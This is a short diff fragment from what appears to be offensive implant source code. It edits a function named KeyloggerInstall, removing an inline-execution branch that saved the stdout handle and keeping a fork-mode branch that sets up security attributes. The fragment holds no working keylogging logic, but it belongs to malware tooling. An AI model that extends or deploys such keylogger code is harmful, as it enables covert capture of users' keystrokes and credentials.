@@ -13,10 +13,6 @@ auto DECLFN KeyloggerInstall(
         return HResult;
     };
 
-    if ( Instance->Ctx.ExecMethod == KH_METHOD_INLINE ) {
-        BckpStdout = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
-    }
-
     if ( Instance->Ctx.ExecMethod == KH_METHOD_FORK ) {
         SECURITY_ATTRIBUTES SecAttr = { 
             .nLength = sizeof(SECURITY_ATTRIBUTES), 
